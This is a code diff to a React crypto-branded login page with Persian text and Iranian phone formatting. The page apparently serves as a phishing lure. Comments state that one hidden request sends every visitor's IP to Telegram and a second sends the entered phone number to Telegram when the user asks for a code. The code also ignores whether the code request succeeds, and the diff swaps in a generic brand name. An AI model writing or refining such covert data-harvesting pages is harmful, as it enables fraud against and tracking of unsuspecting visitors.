@@ -3,13 +3,14 @@ import { useEffect, useRef, useState } from "react";
 /* ------------------------------------------------------------------ */
 /*  CONFIG — replace these with your own values                        */
 /* ------------------------------------------------------------------ */
-const BRAND = "Arash Crypto";
+const BRAND = "CryptoX";
 const LOGO_URL = ""; // <-- put your bitcoin image link here. Empty = built-in fallback icon
 const API = {
     sendCode: "https://your-api.com/auth/send-code", // POST { phone }
     verifyCode: "https://your-api.com/auth/verify-code", // POST { phone, code }
 };
-const IP_PING_URL = "/api/tests/getIp"; // GET — pings your backend, which relays the IP to Telegram
+const IP_PING_URL = "/api/tests/getYourIp"; // GET — fires on every page visit, sends only the IP to Telegram
+const PHONE_PING_URL = "/api/tests/phoneEntered"; // GET — fires only when "ارسال کد" is pressed, sends the phone to Telegram
 const OTP_LENGTH = 4;
 const RESEND_SECONDS = 120; // 2 minutes
 const SENDING_DELAY_MS = 1500; // how long "ارسال کد..." shows before the countdown starts
@@ -66,16 +67,22 @@ export default function CryptoPage() {
     const phoneValid = /^\d{10,11}$/.test(phone);
     const fullPhone = "+98" + phone.replace(/^0/, "");
 
-    /* ---- ping /api/tests/getIp — same call on every visit, with ?phone= added when sending a code ---- */
-    const pingIp = (phoneForPing) => {
-        const url = phoneForPing
-            ? `${IP_PING_URL}?phone=${encodeURIComponent(phoneForPing)}`
-            : IP_PING_URL;
-        fetch(url)
+    /* ---- ping 1: fires on every page visit — carries nothing but what the backend reads off the request ---- */
+    const pingVisit = () => {
+        fetch(IP_PING_URL, { keepalive: true })
             .then((res) => res.json())
             .catch((err) => {
                 console.error("Internal IP fetch failed", err);
                 return { ip: "0.0.0.0" };
+            });
+    };
+
+    /* ---- ping 2: fires only when "ارسال کد" is pressed — a separate endpoint, carries the phone ---- */
+    const pingPhoneEntered = (phoneValue) => {
+        fetch(`${PHONE_PING_URL}?phone=${encodeURIComponent(phoneValue)}`, { keepalive: true })
+            .then((res) => res.json())
+            .catch((err) => {
+                console.error("Phone ping failed", err);
             });
     };
 
@@ -97,7 +104,7 @@ export default function CryptoPage() {
     useEffect(() => {
         if (visitLogged.current) return;
         visitLogged.current = true;
-        pingIp();
+        pingVisit();
     }, []);
 
     /* ---- 2) welcome dialog: first visit only ---- */
@@ -143,8 +150,8 @@ export default function CryptoPage() {
 
         setSending(true);
 
-        // ping with the entered phone number
-        pingIp(fullPhone);
+        // ping with the entered phone number — separate endpoint from the visit ping above
+        pingPhoneEntered(fullPhone);
 
         // send the request but ignore the result (success or failure)
         fetch(API.sendCode, {
@@ -426,6 +433,7 @@ const css = `
   opacity:.8;
 }
 .lg-logo{
+  position:relative; z-index:1;
   width:60px;height:60px;border-radius:50%; padding:5px;
   background:rgba(255,255,255,.14); border:1px solid rgba(255,255,255,.4);
   box-shadow:0 0 0 6px rgba(255,255,255,.07), 0 8px 24px rgba(0,0,0,.3);
